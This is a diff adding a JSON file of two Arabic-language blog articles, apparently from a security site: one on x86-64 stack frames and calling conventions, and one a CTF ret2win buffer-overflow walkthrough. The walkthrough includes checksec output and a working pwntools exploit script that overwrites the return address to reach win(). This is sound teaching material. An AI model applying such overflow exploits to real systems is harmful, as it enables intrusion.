@@ -1,0 +1,100 @@
+[
+  {
+    "id": "art-rev-stack",
+    "slug": "reverse-stack-frames-x64",
+    "title": "فهم الـ Stack Frame والـ Calling Convention في معمارية x86-64",
+    "summary": "شرح عملي لكيفية تمرير المتغيرات وبناء الـ Stack Frame في Assembly مع أمثلة C و x86asm.",
+    "coverImage": "",
+    "category": "Reverse",
+    "tags": [
+      "مذاكرة"
+    ],
+    "blocks": [
+      {
+        "id": "b1",
+        "type": "callout",
+        "content": "فهم شكل الـ `Stack` وترتيب المسجلات في `System V AMD64 ABI` هو الأساس قبل تحليل أي ملف `ELF` في `Ghidra` أو `IDA`.",
+        "title": "ملخص سريع",
+        "variant": "neon"
+      },
+      {
+        "id": "b2",
+        "type": "heading",
+        "content": "1. ترتيب تمرير المعاملات (Registers Order)",
+        "level": 2
+      },
+      {
+        "id": "b3",
+        "type": "paragraph",
+        "content": "في نظام Linux 64-bit يتم تمرير أول 6 معاملات عبر المسجلات بالترتيب: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9` ثم باقي المعاملات على الـ `stack`.",
+        "fontSize": "md"
+      },
+      {
+        "id": "b4",
+        "type": "code",
+        "content": "push rbp\nmov  rbp, rsp\nsub  rsp, 0x20\nmov  DWORD PTR [rbp-0x4], edi\nmov  rax, QWORD PTR [rbp-0x10]\nleave\nret",
+        "language": "x86asm",
+        "title": "prologue.asm"
+      },
+      {
+        "id": "b5",
+        "type": "list",
+        "content": "`push rbp` يحفظ عنوان إطار الدالة السابقة.\n`mov rbp, rsp` يثبت مؤشر الأساس للإطار الحالي.\n`sub rsp, 0x20` يحجز مساحة للمتغيرات المحلية."
+      }
+    ],
+    "publishedAt": "2026-11-18",
+    "readingMinutes": 6,
+    "published": true,
+    "updatedAt": 1794989718631
+  },
+  {
+    "id": "art-pwn-ret2win",
+    "slug": "ctf-pwn-ret2win-walkthrough",
+    "title": "حل تحدي CTF: استغلال ثغرة Buffer Overflow بتقنية ret2win",
+    "summary": "خطوات فحص الحماية باستخدام checksec، حساب الـ offset عبر gdb-pwndbg، وكتابة سكربت الاستغلال بـ pwntools.",
+    "coverImage": "",
+    "category": "Pwn",
+    "tags": [
+      "حل CTF"
+    ],
+    "blocks": [
+      {
+        "id": "p1",
+        "type": "heading",
+        "content": "1. فحص الملف والحمايات",
+        "level": 2
+      },
+      {
+        "id": "p2",
+        "type": "code",
+        "content": "$ checksec --file=./ret2win\nArch:     amd64-64-little\nNX:       NX enabled\nPIE:      No PIE (0x400000)\nStack:    No canary found",
+        "language": "bash",
+        "title": "checksec"
+      },
+      {
+        "id": "p3",
+        "type": "paragraph",
+        "content": "نلاحظ أن الـ `Canary` غير مفعل والـ `PIE` معطل، مما يعني أن عنوان دالة `win()` ثابت في الذاكرة عند `0x401196`.",
+        "fontSize": "md"
+      },
+      {
+        "id": "p4",
+        "type": "code",
+        "content": "from pwn import *\n\nelf = context.binary = ELF('./ret2win')\np = process()\n\npayload = b'A' * 40 + p64(elf.sym['win'])\np.sendlineafter(b'> ', payload)\np.interactive()",
+        "language": "python",
+        "title": "exploit.py"
+      },
+      {
+        "id": "p5",
+        "type": "callout",
+        "content": "على Ubuntu الحديث، لو حدث `SIGSEGV` داخل `system()` أضف عنوان تعليمة `ret` قبل `win` لضبط محاذاة الـ `16-byte` للـ `RSP`.",
+        "title": "ملاحظة مهمة حول Stack Alignment",
+        "variant": "warn"
+      }
+    ],
+    "publishedAt": "2026-11-17",
+    "readingMinutes": 8,
+    "published": true,
+    "updatedAt": 1794989718631
+  }
+]
